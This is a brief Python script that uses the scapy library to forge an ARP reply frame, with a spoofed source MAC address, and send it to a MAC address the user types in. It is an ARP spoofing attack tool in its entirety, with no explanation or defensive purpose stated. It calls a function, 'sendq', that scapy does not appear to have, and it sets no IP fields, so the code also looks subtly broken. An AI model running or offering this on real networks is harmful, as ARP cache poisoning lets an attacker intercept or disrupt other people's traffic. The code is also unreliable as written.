from scapy.all import *

target_mac = input('target_mac>>')
fake_mac_addr = input('fake_mac_addr>>')

eth = Ether(dst = target_mac)

arp = ARP()
arp.op = 2
arp.hwsrc = fake_mac_addr
arp.hwdst = target_mac

frame = eth/arp
sendq(frame)